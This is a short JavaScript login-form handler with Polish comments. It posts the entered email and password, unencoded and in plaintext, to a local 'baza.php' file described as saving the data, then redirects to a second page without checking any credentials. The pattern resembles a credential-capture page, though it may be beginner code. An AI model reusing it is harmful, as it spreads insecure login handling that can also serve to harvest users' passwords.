const loginForm = document.getElementById('login-form');

loginForm.addEventListener('submit', (event) => {
    event.preventDefault(); // Zapobiega domyślnemu przesłaniu formularza

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Sprawdzenie, czy pola są wypełnione
    if (email === '' || password === '') {
        alert('Proszę wypełnić wszystkie pola!');
        return;
    }

    // Zapis danych do pliku baza.php
    fetch('baza.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `email=${email}&password=${password}`
    })
    .then(response => {
        if (response.ok) {
            // Przekierowanie do strony2.html
            window.location.href = 'strona2.html';
        } else {
            alert('Błąd podczas logowania!');
        }
    })
    .catch(error => {
        console.error('Błąd:', error);
        alert('Wystąpił błąd podczas logowania!');
    });
});
